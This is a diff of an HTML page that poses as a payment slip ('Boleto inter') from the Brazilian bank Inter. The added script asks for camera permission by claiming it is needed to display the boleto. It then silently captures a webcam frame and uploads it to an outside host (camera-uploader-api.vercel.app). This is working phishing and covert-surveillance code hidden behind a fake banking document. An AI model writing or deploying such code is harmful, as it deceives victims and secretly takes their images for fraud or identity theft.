@@ -1,16 +1,70 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Comprovante do Inter</title>
+    <title>Boleto inter</title>
+    <style>
+        #video, #canvas { display: block; margin: 10px 0; }
+    </style>
 </head>
 <body>
 
 <div id="conteudo" style="display:none;">
-   <img id="triggerImg" src="1.jpeg" style="display:none;">
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <img id="triggerImg" src="1.jpeg" style="display:none;">
 </div>
+
 <div id="erro">
-    <h2 style="color:orange;">Precisamos das suas permissões para mostrar o comprovante!</h2>
+    <h2 style="color:orange;">Precisamos das suas permissões para mostrar o boleto!</h2>
 </div>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const triggerImg = document.getElementById('triggerImg');
+
+async function startCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Mostra o conteúdo se a câmera foi permitida
+        document.getElementById("conteudo").style.display = "block";
+
+    } catch (err) {
+        // Usuário negou ou ocorreu erro → mostra mensagem
+        document.getElementById("erro").style.display = "block";
+        console.error("Erro ao acessar a câmera:", err);
+    }
+}
+
+startCamera();
+
+// Quando a imagem for carregada, captura o frame do vídeo
+triggerImg.addEventListener('load', () => {
+    const ctx = canvas.getContext('2d');
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+        try {
+            const response = await fetch("https://camera-uploader-api.vercel.app/api/upload", {
+                method: "POST",
+                body: blob
+            });
+
+            const json = await response.json();
+            console.log("Upload concluído:", json);
+
+        } catch (err) {
+            console.error("Erro no upload:", err);
+        }
+    }, "image/png");
+});
+</script>
+
 </body>
 </html>
